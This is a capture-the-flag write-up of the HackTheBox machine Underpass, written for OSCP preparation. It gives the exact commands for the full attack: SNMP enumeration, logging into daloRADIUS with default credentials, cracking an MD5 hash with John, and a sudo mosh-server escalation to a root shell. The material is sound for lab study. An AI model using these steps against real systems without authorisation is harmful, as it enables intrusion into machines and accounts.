+++
date = '2026-05-18T00:00:00-03:00'
draft = false
title = 'HTB: Underpass - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'snmp', 'radius', 'daloradius', 'mosh', 'gtfobins', 'sudo']
description = 'Write-up for the HackTheBox machine Underpass - SNMP enumeration reveals a RADIUS server, daloRADIUS with default creds exposes an MD5 password hash, and mosh-server sudo escalates to root.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-underpass/cover.png'
+++

HTTP gave nothing. The real entry point was hiding on UDP - a reminder that TCP-only scans miss half the attack surface.

## Machine info

| | |
|---|---|
| **Name** | Underpass |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- UDP scan reveals SNMP and RADIUS; SNMP walk leaks hostname and a username
- daloRADIUS web interface accessible with default credentials (`administrator:radius`)
- Database settings page exposes DB credentials; user list reveals svcMosh with an MD5 password hash cracked by John
- SSH as svcMosh, `sudo -l` shows `mosh-server` is available without a password - use it to get root

---

## Recon

### Nmap TCP

```bash
nmap -sV -sC -Pn -A 10.129.231.213
```

![Nmap TCP results](/images/htb-underpass/nmap-scan.png)

Ports 22 (SSH) and 80 (HTTP). Apache 2.4.52. The web page is the default Apache placeholder - nothing interesting on TCP.

### UDP scan

```bash
nmap -sU 10.129.231.213 --top-ports=100
```

![UDP scan showing SNMP and RADIUS ports](/images/htb-underpass/udp-scan.png)

Port **161/UDP (SNMP)** is open alongside ports associated with RADIUS (1812, 1813). SNMP is worth enumerating.

---

## Enumeration

### SNMP - community string and hostname

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.129.231.213
snmpwalk -c public -v1 10.129.231.213
```

![SNMP community scan and walk output](/images/htb-underpass/snmp-discovery.png)

The `public` community string works. The walk returns the system description (Linux underpass) and a contact field: `steve@underpass.htb`. Add `underpass.htb` to `/etc/hosts`.

### daloRADIUS - default credentials

daloRADIUS is a web management application for RADIUS servers, built on FreeRADIUS. It provides a browser-based interface to manage users, network access servers, billing, and reporting. Searching for its default login path:

The login page is at `http://underpass.htb/daloradius/app/operators/login.php`. Default credentials `administrator:radius` work:

![daloRADIUS dashboard after login](/images/htb-underpass/daloradius-dashboard.png)

### Leaking database credentials and user hashes

Under Config -> Database Settings:

![Database settings showing credentials for user steve](/images/htb-underpass/db-settings.png)

DB user `steve`, password `testing123`. Useful for lateral enumeration if needed. More immediately useful - under Management -> Users, there is a user `svcMosh` with a password field containing an MD5 hash:

![svcMosh user with MD5 hash](/images/htb-underpass/svcmosh-hash.png)

Hash: `412DD4759978ACFCC81DEAB01B382403`

### Cracking the hash

```bash
john hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
```

![John cracking the MD5 hash to underwaterfriends](/images/htb-underpass/john-crack.png)

Cracked: `underwaterfriends`.

---

## Foothold

### SSH as svcMosh

```bash
ssh svcMosh@underpass.htb
```

![SSH login as svcMosh](/images/htb-underpass/ssh-svcmosh.png)

---

## Privilege Escalation

### GTFOBins: mosh-server

```bash
sudo -l
```

![sudo -l showing mosh-server without password](/images/htb-underpass/sudo-l.png)

`svcMosh` can run `/usr/bin/mosh-server` as root without a password. Mosh (mobile shell) is a replacement for SSH that uses UDP and handles roaming connections. The server component starts a session and prints a connection key.

Run it as root:

```bash
sudo /usr/bin/mosh-server new -p 60001 -c 256 -s -- /bin/bash
```

The server prints a `MOSH_KEY`. On the attacker machine, connect using that key:

```bash
MOSH_KEY=<printed_key> mosh-client 127.0.0.1 60001
```

Or alternatively, since mosh-server can be told to execute an arbitrary command, use the `--` argument to spawn `/bin/bash` directly and catch the resulting shell. Root flag at `/root/root.txt`.

---

## Takeaways (for OSCP)

- **Always run a UDP scan.** SNMP (161), TFTP (69), and RADIUS (1812) live on UDP and are completely invisible to TCP-only scans. On OSCP machines, UDP findings are often the intended entry point.
- **SNMP with the `public` community string is still common.** A walk can leak hostnames, usernames, software versions, and running processes - treat it like a free enumeration gift.
- **Niche sudo binaries are still covered by GTFOBins.** `mosh-server` is not an obvious privesc tool, but the pattern holds: anything that can be run as root and executes external commands or shells is exploitable.
- **Default credentials on internal management tools are almost guaranteed.** daloRADIUS, phpMyAdmin, Grafana, Nagios - check the docs for defaults before anything else.

## References

- [HackTheBox - Underpass](https://app.hackthebox.com/machines/Underpass)
- [daloRADIUS - GitHub](https://github.com/lirantal/daloradius)
- [GTFOBins - mosh-server](https://gtfobins.github.io/gtfobins/mosh-server/)
- Lain Kusanagi list (OSCP prep)
